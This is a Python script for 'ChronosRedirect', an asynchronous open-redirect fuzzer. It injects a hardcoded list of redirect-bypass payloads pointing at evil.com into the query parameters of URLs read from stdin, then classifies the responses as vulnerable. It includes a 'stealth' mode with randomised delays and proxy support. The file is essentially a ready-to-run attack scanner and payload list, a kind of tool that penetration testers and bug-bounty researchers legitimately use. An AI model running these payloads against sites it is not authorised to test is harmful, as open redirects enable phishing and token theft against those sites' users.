#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse
import sys
import socket
import csv
import random
import json
import logging
from datetime import datetime
from aiohttp import (
    ClientConnectorError, ClientOSError, ServerDisconnectedError,
    ServerTimeoutError, ServerConnectionError, TooManyRedirects
)
from tqdm import tqdm
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from typing import List

# Color constants
LIGHT_GREEN = '\033[92m'
DARK_GREEN = '\033[32m'
YELLOW = '\033[93m'
RED = '\033[91m'
ENDC = '\033[0m'

# Refined payloads
redirect_payloads = [
    "//evil.com", "///evil.com", "////evil.com", "/////evil.com",
    "https:evil.com", "https:/evil.com", "https:///evil.com", "https:////evil.com",
    "https://@evil.com", "https://evil.com@legit.com", "https://evil.com%23@legit.com",
    "https://evil.com%2f%2e%2e", "https://evil.com/%2e%2e",
    "//%5cevil.com", "/%5cevil.com", "/%2e%2e/evil.com", "/%2f%2fevil.com",
    "/%252e%252e/evil.com", "http:%5cevil.com", "https://evil.com#@legit.com",
    "https://evil.com?redirect=https://google.com", "https://evil.com/%09",
    "https://evil.com%3f@google.com", "https://%252f%252fevil.com",
    "https://evil.com/%09example", "http://127.0.0.1:80@evil.com",
    "http://localhost:80@evil.com"
]

def print_banner():
    banner = f"""
{DARK_GREEN}
 ██████╗██╗  ██╗██████╗  ██████╗ ███╗   ██╗ ██████╗ ███████╗      ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗  ██████╗██╗  ██╗
██╔════╝██║  ██║██╔══██╗██╔═══██╗████╗  ██║██╔═══██╗██╔════╝      ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝
██║     ███████║██████╔╝██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   
██║     ██╔══██║██╔══██╗██║   ██║██║╚██╗██║██║   ██║╚════██║╚════╝██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   
╚██████╗██║  ██║██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝███████║      ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝      ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝                                                                                                             
      ChronosRedirect - Open Redirect Fuzzer{ENDC}
"""
    print(banner)

def classify_redirect(original_url, final_url, payload, body_text):
    parsed_original = urlparse(original_url)
    parsed_final = urlparse(final_url)

    if payload in body_text:
        return "partial"
    elif parsed_final.netloc and parsed_final.netloc != parsed_original.netloc:
        if parsed_final.netloc in ["evil.com", "@evil.com", "127.0.0.1", "localhost"]:
            return "vulnerable"
        return "partial"
    else:
        return "safe"

async def load_payloads(payloads_file):
    if payloads_file:
        with open(payloads_file) as f:
            return [line.strip() for line in f]
    else:
        return redirect_payloads

def fuzzify_url(url: str, keyword: str) -> str:
    if keyword in url:
        return url
    parsed_url = urlparse(url)
    params = parse_qsl(parsed_url.query)
    fuzzed_params = [(k, keyword) for k, _ in params]
    fuzzed_query = urlencode(fuzzed_params)
    return urlunparse([
        parsed_url.scheme, parsed_url.netloc, parsed_url.path,
        parsed_url.params, fuzzed_query, parsed_url.fragment
    ])

def load_urls() -> List[str]:
    urls = []
    for line in sys.stdin:
        url = line.strip()
        fuzzed_url = fuzzify_url(url, "FUZZ")
        urls.append(fuzzed_url)
    return urls

async def fetch_url(session, url, method):
    try:
        async with session.request(method, url, allow_redirects=True, timeout=10) as response:
            text = await response.text(errors="ignore")
            return response, text
    except (ClientConnectorError, ClientOSError, ServerDisconnectedError, ServerTimeoutError,
            ServerConnectionError, TooManyRedirects, UnicodeDecodeError, socket.gaierror,
            asyncio.exceptions.TimeoutError):
        logging.error(f'[ERROR] Error fetching: {url}')
        return None, ""

async def process_url(semaphore, session, url, payloads, keyword, pbar, csv_writer=None, json_results=None, stealth=False, method="GET", filter_domain=None, silent=False):
    async with semaphore:
        for payload in payloads:
            if stealth:
                await asyncio.sleep(random.uniform(0.5, 1.5))
            filled_url = url.replace(keyword, payload)
            response, text = await fetch_url(session, filled_url, method)
            if response and response.history:
                final = str(response.url)
                classification = classify_redirect(filled_url, final, payload, text)

                color = {
                    "vulnerable": RED,
                    "partial": YELLOW,
                    "safe": LIGHT_GREEN
                }[classification]

                if classification != "safe" or not silent:
                    tqdm.write(f'{color}[{classification.upper()}]{ENDC} {filled_url} --> {final}')

                if csv_writer:
                    csv_writer.writerow([filled_url, final, classification])
                if json_results is not None:
                    json_results.append({"url": filled_url, "redirect": final, "status": classification})
            pbar.update()

async def process_urls(semaphore, session, urls, payloads, keyword, stealth=False, method="GET", filter_domain=None, silent=False, json_output=None):
    with tqdm(total=len(urls) * len(payloads), ncols=70, desc='Processing', unit='url', position=0) as pbar, \
         open('redirects.csv', mode='w', newline='') as csv_file:
        csv_writer = csv.writer(csv_file)
        csv_writer.writerow(["Payloaded URL", "Final Redirect", "Status"])
        json_results = []
        tasks = [process_url(semaphore, session, url, payloads, keyword, pbar, csv_writer, json_results, stealth, method, filter_domain, silent) for url in urls]
        await asyncio.gather(*tasks, return_exceptions=True)
        if json_output:
            with open(json_output, 'w') as jf:
                json.dump(json_results, jf, indent=2)

async def main(args):
    payloads = await load_payloads(args.payloads)
    urls = load_urls()
    tqdm.write(f'[INFO] Processing {len(urls)} URLs with {len(payloads)} payloads.')
    logging.basicConfig(filename='chronosredirect.log', level=logging.INFO, format='%(asctime)s - %(message)s')
    conn_args = {"proxy": args.proxy} if args.proxy else {}
    async with aiohttp.ClientSession(**conn_args) as session:
        semaphore = asyncio.Semaphore(args.concurrency)
        await process_urls(
            semaphore, session, urls, payloads, args.keyword,
            stealth=args.stealth, method=args.method.upper(),
            filter_domain=args.filter_domain, silent=args.silent,
            json_output=args.output
        )

if __name__ == "__main__":
    print_banner()
    parser = argparse.ArgumentParser(description="ChronosRedirect: A fast open redirect fuzzer")
    parser.add_argument('-p', '--payloads', help='File with payloads (optional)', required=False)
    parser.add_argument('-k', '--keyword', help='Keyword in URLs to replace with payload (default: FUZZ)', default="FUZZ")
    parser.add_argument('-c', '--concurrency', help='Concurrent requests (default: 100)', type=int, default=100)
    parser.add_argument('--proxy', help='HTTP proxy (ex: http://127.0.0.1:8080)', required=False)
    parser.add_argument('--stealth', help='Enable stealth mode with random delay', action='store_true')
    parser.add_argument('--method', help='HTTP method to use (GET or POST)', choices=['GET', 'POST'], default='GET')
    parser.add_argument('--filter-domain', help='Only report redirects to this domain (e.g., evil.com)', required=False)
    parser.add_argument('--output', help='Output JSON file (e.g., results.json)', required=False)
    parser.add_argument('--silent', help='Only show valid findings, suppress informational messages', action='store_true')
    args = parser.parse_args()

    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting...")
        sys.exit(0)
